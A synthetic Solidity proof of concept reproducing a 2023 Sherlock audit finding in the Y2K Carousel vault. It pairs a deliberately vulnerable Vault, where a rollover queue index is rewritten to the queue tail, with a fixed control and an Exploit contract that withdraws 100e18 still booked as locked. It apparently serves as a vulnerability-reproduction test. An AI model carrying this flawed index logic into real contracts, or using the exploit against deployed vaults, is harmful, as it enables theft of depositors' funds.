// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Y2K Earthquake Carousel — ownerToRollOverQueueIndex is rewritten to
    rolloverQueue.length even when the user already has a queue item
    (Sherlock 2023-03, finding 18533, Carousel.enlistInRollover).

    SYNTHETIC, cheatcode-free. The assignment marked @> VULN is the audited
    line. A second enlist points the depositor at the last queue slot. If that
    slot is another user's different epoch, notRollingOver skips the lock and
    withdraw pays out the 100e18 that the queue still books as locked.

    The fixed vault assigns the index only when pushing a new item. The same
    withdraw then reverts and the 100e18 stays in the vault. */

interface IQueueVault {
    function deposit(uint256 epoch, uint256 amount) external;
    function enlistInRollover(uint256 epoch, uint256 amount) external;
}

contract Asset {
    string public name = "Underlying";
    string public symbol = "UND";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;
}

contract Filler {
    function join(IQueueVault vault, Asset asset, uint256 epoch, uint256 amount) external {
        asset.approve(address(vault), amount);
        vault.deposit(epoch, amount);
        vault.enlistInRollover(epoch, amount);
    }
}

contract Victim {
    function depositOnly(IQueueVault vault, Asset asset, uint256 epoch, uint256 amount) external {
        asset.approve(address(vault), amount);
        vault.deposit(epoch, amount);
    }
}

/// Audited enlist: the index write sits outside the else, so an update retargets
/// the user at whatever item happens to be last in the queue.
contract Vault is IQueueVault {
    struct QueueItem {
        uint256 assets;
        address receiver;
        uint256 epochId;
    }

    Asset public asset;
    QueueItem[] public rolloverQueue;
    mapping(address => uint256) public ownerToRollOverQueueIndex;
    mapping(address => mapping(uint256 => uint256)) public balanceOf;

    error AlreadyRollingOver();
    error InsufficientBalance();

    constructor(address _asset) {
        asset = Asset(_asset);
    }

    function queueLength() external view returns (uint256) {
        return rolloverQueue.length;
    }

    function deposit(uint256 epoch, uint256 amount) external {
        asset.transferFrom(msg.sender, address(this), amount);
        balanceOf[msg.sender][epoch] += amount;
    }

    function enlistInRollover(uint256 epoch, uint256 amount) external {
        if (balanceOf[msg.sender][epoch] < amount) revert InsufficientBalance();
        if (ownerToRollOverQueueIndex[msg.sender] != 0) {
            uint256 index = ownerToRollOverQueueIndex[msg.sender] - 1;
            rolloverQueue[index].assets = amount;
            rolloverQueue[index].epochId = epoch;
        } else {
            rolloverQueue.push(QueueItem({assets: amount, receiver: msg.sender, epochId: epoch}));
        }
        // @> VULN: existing rollovers are pointed at the last queue index.
        ownerToRollOverQueueIndex[msg.sender] = rolloverQueue.length;
    }

    /// Same check as Carousel.notRollingOver: only the item selected by the
    /// (now wrong) index can block the withdraw.
    function withdraw(uint256 epoch, uint256 amount) external {
        if (ownerToRollOverQueueIndex[msg.sender] != 0) {
            QueueItem memory item = rolloverQueue[ownerToRollOverQueueIndex[msg.sender] - 1];
            if (item.epochId == epoch && (balanceOf[msg.sender][epoch] - item.assets) < amount) {
                revert AlreadyRollingOver();
            }
        }
        balanceOf[msg.sender][epoch] -= amount;
        asset.transfer(msg.sender, amount);
    }
}

/// Control: the index is stored only when a new queue item is pushed.
contract VaultFixed is IQueueVault {
    struct QueueItem {
        uint256 assets;
        address receiver;
        uint256 epochId;
    }

    Asset public asset;
    QueueItem[] public rolloverQueue;
    mapping(address => uint256) public ownerToRollOverQueueIndex;
    mapping(address => mapping(uint256 => uint256)) public balanceOf;

    error AlreadyRollingOver();
    error InsufficientBalance();

    constructor(address _asset) {
        asset = Asset(_asset);
    }

    function queueLength() external view returns (uint256) {
        return rolloverQueue.length;
    }

    function deposit(uint256 epoch, uint256 amount) external {
        asset.transferFrom(msg.sender, address(this), amount);
        balanceOf[msg.sender][epoch] += amount;
    }

    function enlistInRollover(uint256 epoch, uint256 amount) external {
        if (balanceOf[msg.sender][epoch] < amount) revert InsufficientBalance();
        if (ownerToRollOverQueueIndex[msg.sender] != 0) {
            uint256 index = ownerToRollOverQueueIndex[msg.sender] - 1;
            rolloverQueue[index].assets = amount;
            rolloverQueue[index].epochId = epoch;
        } else {
            rolloverQueue.push(QueueItem({assets: amount, receiver: msg.sender, epochId: epoch}));
            ownerToRollOverQueueIndex[msg.sender] = rolloverQueue.length;
        }
    }

    function withdraw(uint256 epoch, uint256 amount) external {
        if (ownerToRollOverQueueIndex[msg.sender] != 0) {
            QueueItem memory item = rolloverQueue[ownerToRollOverQueueIndex[msg.sender] - 1];
            if (item.epochId == epoch && (balanceOf[msg.sender][epoch] - item.assets) < amount) {
                revert AlreadyRollingOver();
            }
        }
        balanceOf[msg.sender][epoch] -= amount;
        asset.transfer(msg.sender, amount);
    }
}

contract Exploit {
    uint256 public constant LOCKED = 100e18;
    uint256 public constant VICTIM_AMT = 100e18;
    uint256 public constant FILLER_AMT = 1e18;
    uint256 public constant EPOCH = 1;
    uint256 public constant FILLER_EPOCH = 2;

    uint256 public stolen;
    uint256 public shortfall;

    Asset public asset; // nonce 1
    Vault public vault; // nonce 2
    Filler public filler; // nonce 3
    Victim public victim; // nonce 4

    constructor() {
        asset = new Asset();
        vault = new Vault(address(asset));
        filler = new Filler();
        victim = new Victim();

        asset.mint(address(this), LOCKED);
        asset.approve(address(vault), LOCKED);
        vault.deposit(EPOCH, LOCKED);
        vault.enlistInRollover(EPOCH, LOCKED);

        asset.mint(address(filler), FILLER_AMT);
        filler.join(vault, asset, FILLER_EPOCH, FILLER_AMT);

        asset.mint(address(victim), VICTIM_AMT);
        victim.depositOnly(vault, asset, EPOCH, VICTIM_AMT);
    }

    function run() external {
        uint256 cashBefore = asset.balanceOf(address(this));
        uint256 indexBefore = vault.ownerToRollOverQueueIndex(address(this));
        vault.enlistInRollover(EPOCH, LOCKED);
        uint256 indexAfter = vault.ownerToRollOverQueueIndex(address(this));
        uint256 tail = vault.queueLength();
        (, address otherReceiver, uint256 otherEpoch) = vault.rolloverQueue(indexAfter - 1);
        (uint256 queuedAssets,, uint256 queuedEpoch) = vault.rolloverQueue(0);
        vault.withdraw(EPOCH, LOCKED);
        uint256 cashAfter = asset.balanceOf(address(this));
        (uint256 queuedAfter,, uint256 epochAfter) = vault.rolloverQueue(0);
        uint256 vaultCash = asset.balanceOf(address(vault));
        uint256 victimShares = vault.balanceOf(address(victim), EPOCH);
        uint256 fillerShares = vault.balanceOf(address(filler), FILLER_EPOCH);
        require(cashBefore == 0, "cash before");
        require(indexBefore == 1, "own index");
        require(indexAfter == tail && indexAfter == 2, "index is tail");
        require(otherReceiver == address(filler) && otherEpoch == FILLER_EPOCH, "reads filler");
        require(queuedAssets == LOCKED && queuedEpoch == EPOCH, "slot 0 locked");
        require(cashAfter == LOCKED, "withdrew locked");
        require(queuedAfter == LOCKED && epochAfter == EPOCH, "queue remains");
        require(victimShares == VICTIM_AMT && fillerShares == FILLER_AMT, "others intact");
        stolen = cashAfter;
        shortfall = victimShares + fillerShares + queuedAfter - vaultCash;
        require(stolen == LOCKED && shortfall == LOCKED, "short 100e18");
    }
}
